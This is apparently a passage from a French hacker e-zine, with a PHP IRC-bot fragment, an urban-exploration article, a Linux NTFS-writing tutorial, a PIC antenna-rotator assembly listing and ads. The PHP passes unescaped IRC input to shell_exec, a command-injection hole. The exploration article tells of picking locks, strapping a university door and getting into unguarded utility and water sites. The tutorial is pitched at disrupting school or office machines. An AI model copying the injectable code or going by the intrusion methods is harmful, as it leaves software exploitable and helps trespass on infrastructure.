		$nick = $this->nick;				
		for ($x=0;$x&lt;count($scriptlist);$x++)
			{
			$output = shell_exec("/usr/bin/php -q scripts/".$scriptlist[$x]." ".$host." ".$ident." ".$nick." ".$event." ".$string);
			echo $output;
			$sock->sending($link, $output);
			}
		}			
	}


?>


core/script.php stop


core/socket.php start



<?php

class sock
	{
	//pseudo constructeur	
	function sock($host, $port)
		{
		if ($this->validate($host, $port))
			{	
			return(TRUE);
			}
		else
			{
			die ("config error");
			}
		}
	//verification (pour linstant tres basic des caracteres dentrer
	function validate($host, $port)
  		{
	  	if (is_numeric($port) || !is_numeric($host))
  			{
  			return(TRUE);
  			}
	  	else
  			{
  			return(FALSE);
  			}
  		}
	//connecter un socket		
	function con($host,$port)
		{
		$sock = fsockopen($host, $port);
		if (fsockopen)
			{
			return($sock);
			}
		else 
			{
			return(FALSE);
			}					
		}	
	//disconnecter un socket		
	function discon($sock)
		{
			
			if(fclose($sock))
				{
				return(TRUE);
				}
			else
				{
				return(FALSE);	
				}
		}	
	//lire le socket	
	function buffering($sock)
		{
		$buffer = fread($sock,32000);
		return($buffer);
		}
	//ecrire sur le socket
	function sending($sock, $word)
		{
		if(fwrite($sock, $word) === FALSE)
			{
			return(TRUE);
			}
		else
			{
			return(FALSE);
			}
		} 
		
	}
	

?> 


core/socket.php stop



core/wash.php start

<?PHP
class wash
	{
	function wash()
		{
		}
  
  function lsfile($dir)
		{
		$x=0;
		$ls=opendir($dir);
		while(false !== ($lsdir = readdir($ls)))		
			{
		    if(!is_dir($dir."/".$lsdir))
				{
				//echo $lsdir."\r\n";
				$flist[$x]=$lsdir;
				$x++;
				}
			}
		return($flist);
		}		
	}
?>

core/wash.php stop



  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|                                                            \_ \   \\_  \_ \ 1   
 || |                                                              \\_  \_ \   \\_ 1  + 
 || |                                                              \_ \   \\_  \_ \ 1   
 ||'|             http://pornoquebec.com/video/                      \\_  \_ \   \\_  x 
 || |                                                                \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Parce que tout le monde se branle                                     ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[19]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[un affaire d'esploration urbaine]=\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: prommenons nous dans la ville pendant que sm y'est pas!   ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[      vn      ]=\:\ _//     
                                                  \__\________________________/__/ 


Urban Exploration


On  en  entend  peu  parler  et  il  arrive  que l'on en fasse sans s'en rendre compte, notre 
curiositΘ  Θtant  plus  forte  que  tout.   Le  terme  se  traduit Θvidemment en franτais par 
exploration urbaine mais bon le terme est rendu laid...  Pour cause de paresse  j'Θcrirai  UE 
α la place. 

On ne parle pas ici de se promener dans les grandes rues d'une ville mais bien dans les coins 
plus ou moins visitΘs qui suscitent curiositΘ et o∙ il n'y  est  pas  nΘcessairement  dΘclarΘ 
illΘgal d'y circuler sans autorisation.  Certaines places vont repousser  les  moins  tenaces 
comme les Θgouts et les conduits pluviaires (la ou l'eau de pluie est ΘvacuΘe des rues etc.), 
d'autres qui ont le vertige iront pas vraiment sur un toit, le  Tracel  de  Cap-Rouge  ou  un 
pyl⌠ne d'Hydro-QuΘbec.

On  peut  donc  constater  ici  qu'il  faut  un  minimum  d'organisation/prΘparation pour une 
excursion.  On parle pas d'une simple sΘance de trashing (qui peut Ωtre  considΘrΘ  comme  de 
l'UE).  La santΘ avant tout...α plaies ouvertes dans un endroit souillΘ  on  peut  pogner  le 
tΘtanos donc je recommande fortement d'avoir ce vaccin α son  historique.   Aussi,  dΘpendant 
des conditions (et de l'endroit bien s√r), s'habiller chaudement ou avoir un  imper et/ou des 
bottes de pluie.  Une petite liste exhaustive de l'Θquipement qui pourrait Ωtre utile :

-Kodak numΘrique
-ImpermΘable
-Trousse de premiers soins
-Cellulaire
-GPS
-Crayon-papier ou laptop ou PDA/Pocket PC (laptop non recommandΘ sauf si c'est un Panasonic 
 ou dans quelques cas, IBM)
-VΘlo ou char
-Trousse de lockpicking
-Plan et/ou trajet
-Jumelles
-Walkie-talkies (si vous Ωtes a plusieurs)

Bref c'est une activitΘ gΘnΘralement α la portΘe de tout le monde.  Quand je dis les plans ou 
un  trajet,  c'est  parce  qu'α certaines places il est facile de se perdre... et je parle en 
connaissance  de  cause :  un  bΓtiment  dΘsaffectΘ avec un rΘseau de tunnels, τa m'a pris 50 
minutes sortir de la.  Pour ce qui est du kit de lockpicking, je ne parle nullement  d'entrer 
par effraction dans un bΓtiment affectΘ, mais plut⌠t de dΘbarrer des vieux  cadenas  rouillΘs 
ou  des  accΦs  α  des  zones  dΘsaffectΘes.   Bien  s√r tout est remis en place gΘnΘralement 
aprΦs...

Le genre d'UE que je prΘconise et que je prΘfΦre, c'est fouiner les installations dΘsertes et 
pas surveillΘes.  On en trouve souvent d'Hydro-QuΘbec, Bell ou encore des stations de gestion 
de l'eau (Θpuration, Θgouts etc), qui sont plus rares.  Quand on dit que la sΘcuritΘ physique 
des systΦmes de gestion de services est l'un de leurs  points  faibles,  comme  les  systΦmes 
SCADA.  

Effectivement,  quand  un  accΦs repose sur un simple cadenas ou une poignΘe de porte barrΘes 
sur  un  bΓtiment  discret  dans  un  secteur  dΘsert, α peu prΦs toute personne motivΘe peut 
arriver  α  y  accΘder.   Non,  c'est  pas  des  portes en bois, c'est blindΘ.  Je ne tentais 
nullement d'entrer par effraction mais simplement  de  voir si on peut y rentrer.  La rΘponse 
Θtait oui, juste a monter sur le toit (ca  se  grimpe  bien) et passer par la cheminΘe.  bien 
s√r, il y a d'autres facons...  btw si vous voulez imager le tout, voir les pics jointes.

Ce  qui  est  intΘressant avec ce genre de trucs c'est qu'on voit ou peuvent Ωtre les failles 
de  la  sΘcuritΘ  physique  d'un  emplacement...  Comme un simple cadenas qui semble fermΘ et 
barrΘ mais qui ne l'est pas :D

Une autre expΘrience intΘressante, bien que τa peut sembler banal, c'Θtait  α  l'ULaval.   Le 
soir du party de fin de session, α 3h30 AM, trop tard pour  prendre  la  bus  de  ville  pour 
rentrer, pas de lift, bref la merde.  J'ai dΘcidΘ d'aller  α  l'Uni  voir si je pouvais aller 
dans un labo info, pour avoir  dequoi  a  bretter  en  attendant  les  premiΦres  heures.  Me 
tentait surtout pas de rester  dehors a -15 donc j'ai tentΘ de prendre le rΘseau de tunnels : 
barrΘ. Donc, je vais direct au  Pavillon deKoninck.. barrΘ aussi.  J'essaie donc le Bonenfant 
et le Pouliot sans succΦs.  Je  vis  donc un garde de sΘcuritΘ et je tentai d'y demander pour 
accΘder  aux  locaux  d'info.  Il  m'a  demandΘ  pourquoi  je  voulais y aller.  J'ai rΘpondu 
sincΦrement : j'aimerais aller checker les horaires d'autobus  de  ville.  La sincΘritΘ a pas 
payΘ : l'accΦs est rΘservΘ uniquement α ceux qui ont des travaux α finir! So fuck that, quasi 
rΘsignΘ pour aller passer la nuit au Subway, je passe devant le  Vachon  et  juste  de  mΩme, 
quelqu'un  sort  de  la  porte  α  proximitΘ...  BINGO,  je cours pour retenir la porte et je 
rentre... ;)  Sur le coup, aucune idΘe par o∙ aller, je fais  un tour des couloirs principaux 
pour voir s'il y a des issues ou places  intΘressantes,  pas  vraiment α part un local d'info 
que j'ai pas accΦs... Je tente d'aller  au  tunnel mais oups...gardes de sΘcuritΘ... je prend 
un coke dans la machine α coke pour faire  mine de rien et dΦs qu'ils sont passΘs, je pars au 
tunnel.  Un petit  problΦme,  la  porte  est  barrΘe derriere moi!  Donc, α faire attention α 
l'avenir...  Vu qu'il n'y a pas de camΘras alentours. je me permet de voir si les portes dans 
le petit couloir  sont toutes barrΘs...et bien non, il y en a une qui monte α l'Θtage du mΩme 
pavillion  mais  je  dΘcide  de  continuer  dans  les tunnels pour aller au deKoninck. Portes 
barrΘes...  On  sort  le  kit de lockpicking...sans succΦs alors on tente la mΘthode simple : 
une  strap  qu'on  passe  de  l'autre  cotΘ  de la serrure pour la tirer et dΘbarrer.  Access 
Granted et je file au lab info ek ma prox card sans probleme!

En  aucun  cas  il n'est recommandΘ de poser des actes de vandalisme, car il s'agit ici avant 
tout d'exploration,  d'observation  et d'analyse.  Comme on dit souvent, la sΘcuritΘ physique 
est plus  importante  que  la  sΘcuritΘ  logistique...  Dites-vous que la sΘcuritΘ d'une zone 
dΘsaffectΘe a de fortes chances de ressembler α celle d'une zone similaire qui ne l'est pas.  

Une de mes explorations les plus marquantes fut celle d'un terrain  d'hydro-QuΘbec  o∙  il  y 
avait un bΓtiment contenant des ΘlΘments de gestion du  rΘseau  Θlectrique, et sur le terrain 
adjacent, une ancienne station de pompage et nettoyage  de  l'eau,  souterraine, qu'on voyait 
pas de l'extΘrieur.

Utilisez votre imagination et votre curiositΘ sera servie... mais pas forcΘment ΘtanchΘe :)


any ? MSN : mh.daryaei@uac.edu.ir  (no mail)


P.S.: c4ndu jel sais que j'Θcris comme un journaliste pas besoin de prΘciser


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || | Pour ceux qui voudrais voir d'autre photo d'UE que celle   \\_  \_ \   \\_ -  : '
 ||`| incluse dans se e-zine, Eth0 vous offre sa collection      \_ \   \\_  \_ \ 1   
 || | personnel, disponible a l'addresse suivante :                \\_  \_ \   \\_ 1  + 
 || |                                                              \_ \   \\_  \_ \ 1   
 ||'|                                                                \\_  \_ \   \\_  x 
 || |                                                                \_ \   \\_  \_ \  `
 || |    http://eth0.illusionnetwork.org/gallery/Urban-Exploration     \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Une GracieusetΘ de la communautΘ #Hack.fr                             ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[20]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[NTFS Θcriture possible avec nuX ?=\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka:                                                           ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[   fluxius    ]=\:\ _//     
                                                  \__\________________________/__/ 



              0001001000000100000001001000001000000100010000000000010
              010      __  __           __  _____                 000 
              000     / / / /___ ______/ /_|__  /   _____  ____   001  
              001    / /_/ / __ `/ ___/ //_//_ < | / / _ \/ ___/  010
              000   / __  / /_/ / /__/ ,< ___/ / |/ /  __/ /      000
              000  /_/ /_/\__,_/\___/_/|_/____/|___/\___/_/       001
              010            http://hackever.n0ne.org             000
              0100010001000000100001001000001001000000010000010000100


1. Introduction :

Beaucoup  de  personnes  considΦrent  le NTFS comme inviolable par le dangereux TuX, mais ils 
devraient Θviter de penser trop fort...

En  effet,  Linux  lit parfaitement bien les partitions NTFS mais ├á du mal ├á Θcrire dessus. 
Nous allons ├á travers diffΘrentes Θtapes, vous expliquez comment ├⌐crire dans une partitions 
NTFS avec Linux.

Les administrateurs rΘseaux risquent d'├εtre bien dΘτus.

-----------------------------------------------------------------------------------------------

1.1 Lecture de la partition NTFS (rΘcapitulatif) :

Comment je l'ai dis plus haut, Linux n'a aucuns problΦmes ├á lire les partitions  NTFS.  Ceci 
dit vΘrifier tout de mΩme si le NTFS est reconnu.
  ________________________________
 |                                |
 | $ cat /proc/filesystems        |
 |________________________________|

Cr├⌐er un point de montage :
   _____________________________________________________________
  |                                                            |
  | $ sudo mkdir /mnt/windobe                                  |
  | password :                                                 |
  | $ sudo mount /dev/hda1 /mnt/windobe -t ntfs -o umask=0222  |
  |____________________________________________________________|

Bon l├á vous devriez avoir accΦs ├á vos fichier Windows sans le moindre soucis. Mais vous  ne 
pouvez pas Θcrire ? Ce n'est pas un problΦme.

1.2 Ecriture :

Alors  voil├á, j'ai fais connaissance du projet Captive qui permet d'Θcrire sur une partition 
NTFS :-)
supportaient pas d?interface web,  vous  pouvez  p-e  toutefois  quand mΩme vous connecter en
Ce  qu'il  faut  faire  avant  tout c'est de monter la partition sur un point de montage pour 
rechercher le fichier ntfs.sys  et  ntoskrnl.exe  aprΦs  avoir installer Captive. TΘlΘchargez 
avant tout http://www.jankratochvil.net/project/captive/ .

Pour une installation gΘnΘraliste :
  ____________________________________
 |                                    |
 | $ tar xzf captive-static-x.tar.gz  |
 | $ cd captive-static-x              |             
 | $ sudo ./install                   |
 |____________________________________|

Lorsque que le package est installΘ :
  __________________________________
 |                                  | 
 | $ sudo captive-install-acquire   |
 |__________________________________|


Bon l├á une fenΩtre apprait et l├á indiquer la position des fichiers ntfs.sys et ntoskrnl.exe 
qui  sont  indispenssable  au fonctionnement de Captive. Si tout c'est bien passΘ vous pouvez 
enfin monter la partition :
  _________________________________
 |                                 | 
 | $ sudo mount /mnt/captive-X     |
 |_________________________________|

Pour  connaεtre  le  x  pas  la  peine  de faire de produit en croix ^^ vous avez juste ├á le 
chercher :
  ______________________
 |                      |
 |  $ mount -a          |
 |______________________|


Si tout s'est bien dΘroulΘ dans /etc/fstab vous devriez avoir τa :

  __________________________________________________________________________
 |                                                                          |
 | .....//                                                                  |
 | /dev/hda1 /mnt/windobe captive-ntfs gid=501,dmask=777,fmask=777 0 0      |
 | ....//                                                                   |
 |__________________________________________________________________________|

______________________________________________________________________________________________________

1.3 InterΩt de ce tuto ? :

Bien  imaginez  que vous Ωtes dans une boεte ou dans votre lycΘe et que vous voulez foutre un 
peu le bordel,  c'est  le  moment de faire bouger tout τa :-). Par contre attention ! Si vous 
utilisez un live-cd il faudrais installer le systΩme dans le disque dur ou sinon modifier  sa 
distribution  pour  implenter  Captive  en  Live-CD.  Si vous avez des problΦmes venez sur le 
forum :-P

Tutorial by -----x[FlUxIuS]x--> <<<[(-_-)]>>>
                                   
                                    (c)Hack3ver - All rights reversed.




  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|                                                            \_ \   \\_  \_ \ 1   
 || |Vous voulez avoir l'air dun vrai hacker sans avoir a          \\_  \_ \   \\_ 1  + 
 || |apprendre? Le google hacking et pour vous:                    \_ \   \\_  \_ \ 1   
 ||'|http://johnny.ihackstuff.com                                    \\_  \_ \   \\_  x 
 || |des milliers de patterns vous attendent                          \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ ./google                                                              ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[21]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[un affaire d'antenne qui tourne] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: antenna rotator                                           ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[     n0p      ]=\:\ _//     
                                                  \__\________________________/__/ 



Je n'ai pas l'intention de faire un grand texte style tutorial  pour  mon  ratator.  Je  vais 
seulement indiquer quelque precisions importante et pour le reste vous n'aurez qu'α me mailer 
α mon addresse actuelle soit celle α la fin de ce petit article.

Premierement  le  but  de  ce  projet  Θtait  en  premier  lieu  de  faire  quelque chose qui 
fonctionnait independament du pc, qui utilisait un step motor et qui utilisait  le  "PCL"  du 
PIC. Il n'a donc pas ΘtΘ pensΘ afin d'Ωtre le plus pratique possible. Pour  rΘpondre  tout de 
suite α la question, oui le PIC pourrait etre  branchΘ  au  PC  afin  de  pouvoir  controller 
l'angle de l'antenne avec un software. Ce serait meme selon  moi  plus  facile que d'utiliser 
des bouton car nous n'avons plus besion de temporisation, d'attente d'initialisation etc.

Ceci  Θtant  dit,  parlons un peu du step motor. Il α ΘtΘ recyclΘ d'un vieu lecteur disquette 
5"1/4, il est unipolaire et fonctionne sous 12v, 70 ohms par coil. Les  2N2222a s ont donc un 
peu abusif mais je les avait sous la main. Vous pouvez donc ajuster votre choix de transistor 
en fonction du moteur que vous utiliserez. Vous  pourriez  aussi utiliser un moteur bipolaire 
avec deux H-bridges mais il faudrait  modifier  un  peu  le code du PIC. Les  kick-back diode 
pourrait elle aussi Ωtre facilement remplacΘe par α peu prΦs n'importe quoi qui peu supporter 
~15v et l'ampΦrage du moteur utilisΘ.

Regardons  de  plus  prΦs ce PIC justement. J'ai utilisΘ un 16F88 car c'est avec eux  que  je 
travail  en  ce  moment mais un 16f84(a), 16f628 ou tout autre equivalent  ferait  trΦs  bien 
l'affaire avec quelque modification mineur du code.

Pour  ce  qui est du circuit RC branchΘ au schmitt trigger, vous devrez vous assurer  que  la 
constante de temps soit compatible avec le programme du PIC. Pour  les  boutons  branchΘs sur 
RB6, RB7, les valeurs ne sont pas trop critique mais pour ceux branchΘs α RB4 et RB5, je vous 
conseil vivement d'utiliser les valeurs de la shΘmatique. 

Pour finir, pour ce qui est da l'alimentation, vous pouvez faire votre +5v avec  α  peu  prΦs 
n'importe quoi car les deux chips suce un minimum de courant, le +12v quant α  lui, peu venir 
d'un PC ou de tout ce qui peut fournir le moteur en ampΦrage.

Ha! j'oubliais, le montage a un bug, vous vous en rendrez compte, α la suite d'un  changement 
de l'angle de l'antenne du cotΘ opposΘ α celui utilisΘ prΘcΘdament, l'antenne va dabors faire 
un pas dans l'ancien sens pour ensuite faire les autres du  cotΘ  demandΘ.  Cela est du a une 
mauvaise programmation mais ce n'est qu'un petit  circuit  vite  fait  et  je ne trouvais pas 
vraiment important de me forcer pour le  rendre parfait. Rien ne vous empΩche de modifier mon 
code est de m'envoyer la correction ;).

J'espΦre que ces petites prΘcisions pourrons vous aider α construire votre propre  rotator et 
si ce n'est pas suffisant, n'Θsitez pas α m'Θcrire.

P.S. Je n'ai jamais suivit de cours en Θlectronique donc je ne suis pas trΦs au  courant  des 
normes et des conventions pour ce qui est de l'optimisation de  protoboard  et la crΘation de 
shΘmatique. J'espΦre que ceci ne rendra pas trop difficile la comprΘhention de ce texte.


n0p (n0px90@gmail.com)


---------------------- AJOUT DE DERNIERE MINUTE ---------------------
Apres avoir donnΘ mon article en version final a Wyzeman, j'ai reτu une chip  qui  me  permet 
entre autre de driver un moteur unipolaire comme celui utilisΘ pour mon antenna rotator. J'ai 
donc dΘcidΘ de refaire mon circuit en incluant  la  chip  en  question  (A6801 d'Allegro) qui 
remplace les quatres transistors et les quatres kick-back diode.  J'ai  ajoutΘ  une pic de ce 
montage (circuit_ver1-1.JPG) mais pas de shematic car la  transition de un a l'autre est tres 
facile et de toute faτon, ce n'est pas une chip qui cour les rues.
---------------------- AJOUT DE DERNIERE MINUTE ---------------------


---------------------------- cut here -------------------------------
	LIST p=16f88
	
	#include &lt;p16f88.inc>

	__CONFIG _CONFIG1, B'11111111110000' ; WDT Disable, BOR Enable, PWRT Enable
	__CONFIG _CONFIG2, B'11111111111111'

OPTION_VAR EQU B'10000101'
OSCCON_VAR EQU B'01111110'
INTCON_VAR EQU B'10000000'

BANK0	macro
	bcf STATUS, RP0
	endm
BANK1	macro
	bsf STATUS, RP0
	endm

	CBLOCK 0x020
	pointer :1
	postscaler :1
	speed :1
	w_tmp
	status_tmp
	ENDC

	org 0x000
	goto init

	org 0x004
        movwf w_tmp
        swapf STATUS, w
        movwf status_tmp
        call inttmr0

        swapf status_tmp, w
        movwf STATUS
        swapf w_tmp, f
        swapf w_tmp, w

        retfie

inttmr0
	decf postscaler, f
	bcf INTCON, TMR0IF
	return

init
	clrf PORTA
	clrf PORTB
	BANK1
	movlw OPTION_VAR ; Register initialisation
	movwf OPTION_REG
	movlw OSCCON_VAR
	movwf OSCCON
	movlw INTCON_VAR
	movwf INTCON
	clrf ANSEL ; All PORTA = Digital
	clrf TRISA ; All PORTA = Output
	BANK0
	clrf pointer ; pointer = 0
	clrf speed ; speed = 0
init_button ; wait for button initialisation
	btfsc PORTB, 4
	goto init_button
	btfsc PORTB, 5
	goto init_button
	goto start

delay	; 8.192ms @ 8Mhz
	clrf TMR0
	bcf INTCON, TMR0IF
loop
	btfss INTCON, TMR0IF
	goto loop
	return

delay_sec ; 0.8192s @ 8Mhz
	clrf TMR0
	bcf INTCON, TMR0IF
	movlw 0x10 ; Numbre of TMR0 overflow (prescaler 1:64)
	movwf postscaler
	bsf INTCON, TMR0IE
loop_sec
	movf postscaler, w
        sublw 0x00 ; postscaler = 0?
        btfss STATUS, Z
	goto loop_sec
	bcf INTCON, TMR0IE
	return

step_cw
	movf pointer, w
	call bits
	movwf PORTA ; One step forward
	btfss PORTB, 6 ; If RB6 set speed-up cw
	call delay_sec
	call delay
	movf pointer, w
	sublw 0x03 ; pointer = 3?
	btfss STATUS, Z
	goto inc_ptr
	clrf pointer
	return
inc_ptr
	incf pointer, f
	return

step_ccw
	movf pointer, w
        call bits
        movwf PORTA ; One step backward
	btfss PORTB, 7 ; If RB7 set speed-up cw
	call delay_sec
        call delay
	movf pointer, w
	sublw 0x00 ; pointer = 0?
        btfss STATUS, Z
        goto dec_ptr
        movlw 0x03
	movwf pointer
        return
dec_ptr
        decf pointer, f
        return

bits
	addwf PCL, f
	retlw 0x01
	retlw 0x02
	retlw 0x04
	retlw 0x08
	
start
	btfsc PORTB, 4
	call step_cw
	btfsc PORTB, 5
	call step_ccw
	btfsc PORTB, 6
	call step_cw
	btfsc PORTB, 7
        call step_ccw
	goto start
	
	END

---------------------------- cut here -------------------------------


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|                                                            \_ \   \\_  \_ \ 1   
 || |                                                              \\_  \_ \   \\_ 1  + 
 || |             http://mrgibson.zapto.org                        \_ \   \\_  \_ \ 1   
 ||'|                                                                \\_  \_ \   \\_  x 
 || |                                                                \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Membre Honnoraire du Webring Hack.fr                                  ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[22]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ un affaire de google          ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
